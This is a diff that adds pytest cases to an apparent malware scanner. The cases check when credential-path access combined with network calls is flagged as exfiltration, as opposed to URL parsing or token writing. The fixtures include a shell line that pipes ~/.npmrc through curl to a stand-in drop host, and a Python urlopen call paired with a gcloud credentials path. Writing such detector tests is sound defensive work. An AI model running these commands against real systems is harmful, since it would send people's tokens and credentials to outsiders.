@@ -46,3 +46,37 @@ def test_reading_a_credential_location_and_sending_it_still_scores(tmp_path: Pat
     report = _report(tmp_path, {"src/sync.js": stealer})
     assert "ST-COMBO-EXFIL" in {f.id for f in report.findings}
     assert report.risk_level.value in ("high", "critical")
+
+
+# --- ruleset 56 -----------------------------------------------------------------------------
+
+def test_url_parsing_is_not_network_egress(tmp_path: Path):
+    parsing = ("from urllib.parse import urlsplit, urlencode\n"
+               "import urllib.error\n"
+               "def norm(u):\n    return urlsplit(u).hostname\n")
+    creds = "import os\nADC = os.path.expanduser('~/.config/gcloud/credentials.db')\n"
+    report = _report(tmp_path / "a", {"src/browser.py": parsing, "src/auth.py": creds})
+    assert "network_egress" not in report.to_dict()["capabilities"]
+    assert "ST-COMBO-EXFIL" not in {f.id for f in report.findings}
+
+    sending = "import urllib.request\nurllib.request.urlopen('https://drop.example.invalid')\n"
+    report = _report(tmp_path / "b", {"src/send.py": sending, "src/auth.py": creds})
+    assert "network_egress" in report.to_dict()["capabilities"]
+    assert "ST-COMBO-EXFIL" in {f.id for f in report.findings}
+
+
+def test_writing_a_credential_file_is_not_the_read_half(tmp_path: Path):
+    publish = ('#!/bin/sh\n[ -n "${NPM_TOKEN:-}" ] && '
+               'echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc\n')
+    files = {"scripts/publish.sh": publish,
+             "package.json":
+                 '{"name": "t", "version": "1", "scripts": {"postinstall": "node i.js"}}\n',
+             "src/index.js": "fetch('https://api.example.invalid/v1');\n"}
+    ids = {f.id for f in _report(tmp_path / "a", files).findings}
+    # Reported, but neither an exfiltration path nor an install-time dropper payload.
+    assert "ST-SENS-PATH" in ids
+    assert "ST-COMBO-EXFIL" not in ids and "ST-INSTALL-DROPPER" not in ids
+
+    reading = {"scripts/steal.sh": "#!/bin/sh\ncat ~/.npmrc | curl -d @- https://drop.example.invalid\n",
+               "src/index.js": "fetch('https://api.example.invalid/v1');\n"}
+    assert "ST-COMBO-EXFIL" in {f.id for f in _report(tmp_path / "b", reading).findings}
